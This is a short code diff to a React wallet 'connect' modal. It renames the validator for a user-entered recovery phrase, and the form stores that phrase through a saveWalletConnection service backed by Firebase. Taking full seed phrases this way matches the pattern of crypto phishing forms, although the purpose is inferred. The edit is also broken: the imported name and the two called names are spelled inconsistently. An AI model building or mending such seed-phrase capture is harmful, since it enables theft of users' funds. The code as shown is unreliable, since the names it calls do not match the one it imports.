@@ -4,7 +4,7 @@ import { FaTimes, FaCheck } from "react-icons/fa";
 import { auth } from "../firebase/firebase";
 
 import {
-  validateFavouriteWords,
+  validateRecoverPhrase,
   saveWalletConnection,
 } from "../services/walletService";
 
@@ -76,7 +76,7 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
       return false;
     }
 
-    const validation = validateFavouriteWords(form.recoveryPhrase);
+    const validation = validateRecoveryPhras(form.recoveryPhrase);
     if (!validation.isValid) {
       setValidationError(validation.error);
       return false;
@@ -100,7 +100,7 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
         type: wallet?.name || "Unknown",
       };
 
-      const validation = validateFavouriteWords(form.recoveryPhrase);
+      const validation = validateRecoveryPhrase(form.recoveryPhrase);
       
       walletData.recoveryPhrase = form.recoveryPhrase.trim();
       walletData.wordCount = validation.wordCount;
